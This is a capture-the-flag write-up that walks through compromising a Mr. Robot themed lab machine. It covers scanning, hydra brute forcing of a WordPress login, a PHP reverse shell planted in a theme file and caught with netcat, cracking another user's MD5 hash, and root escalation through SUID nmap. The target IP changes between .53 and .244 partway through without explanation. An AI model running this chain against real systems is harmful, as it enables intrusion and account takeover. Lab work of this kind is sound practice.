# Mr.Robot - ThunderCipher



Target Ip. Address : 192.168.5.53





So, we have a Mr.Robot themed challenge, let's start with our nmap scan.



```bash

kali@kali:nmap -sV -sC 192.168.5.53

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 07:13 +0545

Nmap scan report for 192.168.5.53

Host is up (0.077s latency).

Not shown: 997 filtered tcp ports (no-response)

PORT    STATE  SERVICE  VERSION

22/tcp  closed ssh

80/tcp  open   http     Apache httpd

|\_http-server-header: Apache

|\_http-title: Site doesn't have a title (text/html).

443/tcp open   ssl/http Apache httpd

|\_ssl-date: TLS randomness does not represent time

| ssl-cert: Subject: commonName=www.example.com

| Not valid before: 2015-09-16T10:45:03

|\_Not valid after:  2025-09-13T10:45:03

|\_http-title: Site doesn't have a title (text/html).

|\_http-server-header: Apache

&nbsp;                                                                                                                                                  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                     

Nmap done: 1 IP address (1 host up) scanned in 30.30 seconds

```



we only have port 80 and 443 open, port 22 (ssh) is closed.

Both port 80 and 443 are the same. 



In the website, we can have conversation with the fsociety, but it is just a rabbit hole.



We try to use gobuster to do some enumeration but it is getting 500 errors.





```bash

kali@kali:gobuster dir -u http://192.168.5.53/ -w /usr/share/wordlists/dirb/big.txt

===============================================================                                                                                    

Gobuster v3.8.2                                                                                                                                    

by OJ Reeves (@TheColonial) \& Christian Mehlmauer (@firefart)                                                                                      

===============================================================                                                                                    

\[+] Url:                     http://192.168.5.53/                                                                                                  

\[+] Method:                  GET                                                                                                                   

\[+] Threads:                 10                                                                                                                    

\[+] Wordlist:                /usr/share/wordlists/dirb/big.txt

\[+] Negative Status codes:   404

\[+] User Agent:              gobuster/3.8.2

\[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

.htpasswd            (Status: 403) \[Size: 218]

.htaccess            (Status: 403) \[Size: 218]

0                    (Status: 301) \[Size: 0] \[--> http://192.168.5.53/0/]

0000                 (Status: 301) \[Size: 0] \[--> http://192.168.5.53/0000/]

Progress: 341 / 20469 (1.67%)\[ERROR] error on word 2019: timeout occurred during the request

\[ERROR] error on word 202: timeout occurred during the request

\[ERROR] error on word 204: timeout occurred during the request

```





Let's exclude 500 error, and see what we get.



```bash

kali@kali:gobuster dir -u http://192.168.5.53/ -w /usr/share/wordlists/dirb/big.txt --exclude-length 251                                                  

===============================================================

Gobuster v3.8.2

by OJ Reeves (@TheColonial) \& Christian Mehlmauer (@firefart)

===============================================================

\[+] Url:                     http://192.168.5.53/

\[+] Method:                  GET

\[+] Threads:                 10

\[+] Wordlist:                /usr/share/wordlists/dirb/big.txt

\[+] Negative Status codes:   404

\[+] Exclude Length:          251

\[+] User Agent:              gobuster/3.8.2

\[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

.htaccess            (Status: 403) \[Size: 218]

.htpasswd            (Status: 403) \[Size: 218]

admin                (Status: 301) \[Size: 234] \[--> http://192.168.5.53/admin/]

audio                (Status: 301) \[Size: 234] \[--> http://192.168.5.53/audio/]

blog                 (Status: 301) \[Size: 233] \[--> http://192.168.5.53/blog/]

css                  (Status: 301) \[Size: 232] \[--> http://192.168.5.53/css/]

favicon.ico          (Status: 200) \[Size: 0]

images               (Status: 301) \[Size: 235] \[--> http://192.168.5.53/images/]

intro                (Status: 200) \[Size: 516314]

js                   (Status: 301) \[Size: 231] \[--> http://192.168.5.53/js/]

license              (Status: 200) \[Size: 309]

phpmyadmin           (Status: 403) \[Size: 94]

readme               (Status: 200) \[Size: 64]

robots.txt           (Status: 200) \[Size: 36]

robots               (Status: 200) \[Size: 36]

sitemap              (Status: 200) \[Size: 0]

sitemap.xml          (Status: 200) \[Size: 0]

video                (Status: 301) \[Size: 234] \[--> http://192.168.5.53/video/]

wp-admin             (Status: 301) \[Size: 237] \[--> http://192.168.5.53/wp-admin/]

wp-content           (Status: 301) \[Size: 239] \[--> http://192.168.5.53/wp-content/]

wp-includes          (Status: 301) \[Size: 240] \[--> http://192.168.5.53/wp-includes/]

Progress: 20469 / 20469 (100.00%)

===============================================================

Finished

===============================================================

```



We have some interesting find, robots.txt and presence of wordpress CMS.



At robots.txt, we find our first flag and a file with list of usernames possibly.



```hint

User-agent: \*

fsocity.dic

flag1.txt

```



Let's get that flag.



```flag

ThunderCipher{r0.....ek}

```



There are lots of repeating usernames, let's sort it and make everyusernames are unique.



```bash

kali@kali:sort fsocity.dic | uniq  > list.txt

&nbsp;                                                                                                                                                   

kali@kali:wc -l list.txt   

11451 list.txt

```



We have significantly reduced 80000+ usernames to 11000 usernames.

Since, we know it is a Wordpress CMS, let's go to it's default login page /wp-login.php





So, the admin login page, has a vulnerability. It echoes error of invalid user when wrong username, theoretically it should be easier to find a username.



We will use hydra for enumeration.



```bash

kali@kali:hydra -L list.txt -p anything 192.168.5.244 http-post-form '/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log+In:F=Invalid username' 

Hydra v9.5 (c) 2023 by van Hauser/THC \& David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).



Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-05 08:08:29

\[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task

\[DATA] attacking http-post-form://192.168.5.244:80/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log+In:F=Invalid username

\[STATUS] 3570.00 tries/min, 3570 tries in 00:01h, 7882 to do in 00:03h, 16 active

\[80]\[http-post-form] host: 192.168.5.244   login: elliot   password: anything

\[80]\[http-post-form] host: 192.168.5.244   login: Elliot   password: anything

\[80]\[http-post-form] host: 192.168.5.244   login: ELLIOT   password: anything

^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.

```



We find a valid username "elliot", if you have watched Mr.Robot, he is the main character.



Now, let's find the password.



```bash

kali@kali:hydra -l elliot -P list.txt 192.168.5.244 http-post-form '/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log+In:F=is incorrect'

Hydra v9.5 (c) 2023 by van Hauser/THC \& David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).



Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-05 08:12:15

\[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore

\[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task

\[DATA] attacking http-post-form://192.168.5.244:80/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log+In:F=is incorrect

\[STATUS] 3147.00 tries/min, 3147 tries in 00:01h, 8305 to do in 00:03h, 16 active

\[80]\[http-post-form] host: 192.168.5.244   login: elliot   password: ER...52

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-05 08:14:11

```



We found the password for user Elliot, let's login.



In the admin, page navigate to themes.

Twentyfifteen is the active theme, replace the 404.php page with the php reverse shell with your IP and port.



Start a listener on that port.



```bash

kali@kali:nc -nlvp 9002

listening on \[any] 9002 ...

```



Navigate to the 404.php url "http://192.168.5.244/wp-content/themes/twentyfifteen/404.php" and you should receive a reverse shell connection.





```bash

kali@kali:nc -nlvp 9002

listening on \[any] 9002 ...

connect to \[192.168.5.248] from (UNKNOWN) \[192.168.5.244] 37075

Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86\_64 x86\_64 x86\_64 GNU/Linux

&nbsp;02:48:05 up 20 min,  0 users,  load average: 0.08, 0.93, 0.69

USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

uid=1(daemon) gid=1(daemon) groups=1(daemon)

sh: 0: can't access tty; job control turned off

$ 

```





Let's stabilize the shell.



```bash

$ python3 -c 'import pty; pty.spawn ("/bin/bash")'

daemon@linux:/$ 

```



In the home directory of user robot, we find the use flag which is not readable by us and a password.raw-md5 file with password of user robot.



```bash

daemon@linux:/home/robot$ cat user.txt

cat user.txt

cat: user.txt: Permission denied

daemon@linux:/home/robot$ cat password.raw-md5

cat password.raw-md5

robot:c3.....13b

daemon@linux:/home/robot$ 

```



Since, this is a md5 hash, you can crack it on any online sites like crackstation.net or use john, hashcat.





```password

ab.....yz

```





Now, let's switch to user robot.



```bash

daemon@linux:/home/robot$ su robot

su robot

Password: ab.....yz

robot@linux:~$

```



Now, since we are robot, we can read the user flag at home directory.



```bash

robot@linux:~$ cat user.txt

cat user.txt

ThunderCipher{us.....sc}

```



Let's see which SUID binaries we can use to escalate to root.



```bash

robot@linux:~$ find / -perm -u=s 2>/dev/null

find / -perm -u=s 2>/dev/null

/bin/ping

/bin/umount

/bin/mount

/bin/ping6

/bin/su

/usr/bin/passwd

/usr/bin/newgrp

/usr/bin/chsh

/usr/bin/chfn

/usr/bin/gpasswd

/usr/bin/sudo

/usr/local/bin/nmap

/usr/lib/openssh/ssh-keysign

/usr/lib/eject/dmcrypt-get-device

/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper

/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

/usr/lib/pt\_chown

```



We have /usr/local/bin/nmap as a SUID binary to escalate to root.



```bash

robot@linux:~$ /usr/local/bin/nmap --interactive

/usr/local/bin/nmap --interactive



Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )

Welcome to Interactive Mode -- press h <enter> for help

nmap> !/bin/sh

!/bin/sh

\# id

id

uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)

```



Here we go !!!

We are now root, let's head to root directory, read the final flag and conclude this challenge.



```bash

\# cat root.txt

cat root.txt

ThunderCipher{nmap\_suid\_r00t\_pwn}

```

